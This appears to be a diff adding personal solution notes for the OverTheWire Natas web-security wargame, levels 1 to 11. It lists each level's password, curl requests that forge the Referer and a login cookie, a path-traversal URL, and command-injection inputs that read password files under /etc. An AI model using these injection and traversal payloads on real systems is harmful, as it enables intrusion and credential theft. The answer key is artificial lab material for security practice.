@@ -1,0 +1,43 @@
+level 1 : gtVrDuiDfck831PqWsLEZy5gyDz1clto
+
+level 2 : ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi
+
+level 3 : sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
+
+level 4 : Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
+
+Request header has a referer as same as the page. change it to what the page expects 
+
+curl 'http://natas4.natas.labs.overthewire.org/index.php' -H 'Host: natas4.natas.labs.overthewire.org' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:58.0) Gecko/20100101 Firefox/58.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Referer: http://natas5.natas.labs.overthewire.org/' -H 'Cookie: __cfduid=ddcad44a22ee2b392d119cd9be6ce49a81515671269; __utma=176859643.1655457877.1515671270.1515726302.1518005289.4; __utmz=176859643.1515671270.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided); __utmc=176859643' -H 'Authorization: Basic bmF0YXM0Olo5dGtSa1dtcHQ5UXI3WHJSNWpXUmtnT1U5MDFzd0Va' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1'
+
+
+level 5 : iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
+
+there's a parameter in request as loggedin
+
+curl 'http://natas5.natas.labs.overthewire.org/' -H 'Host: natas5.natas.labs.overthewire.org' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:58.0) Gecko/20100101 Firefox/58.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Referer: http://natas4.natas.labs.overthewire.org/index.php' -H 'Cookie: __cfduid=ddcad44a22ee2b392d119cd9be6ce49a81515671269; __utma=176859643.1655457877.1515671270.1515726302.1518005289.4; __utmz=176859643.1515671270.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided); __utmc=176859643; loggedin=1' -H 'Authorization: Basic bmF0YXM1OmlYNklPZm1wTjdBWU9RR1B3dG4zZlhwYmFKVkpjSGZx' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' -H 'Cache-Control: max-age=0'
+
+level 6 : aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1
+
+secret is in the request of includes/secret.inc
+
+level 7 : 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9
+
+http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8
+
+level 8 : DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe
+
+need a php runner
+	$secret = "3d3d516343746d4d6d6c315669563362";
+	$a = base64_decode(strrev(hex2bin($secret)));
+	echo $a;
+
+level 9 : W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl
+
+search below string
+	a | cat /etc/natas_webpass/natas10
+
+level 10 : nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu 
+	"" /etc/natas_webpass/natas11 #
+
+level 11 : U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
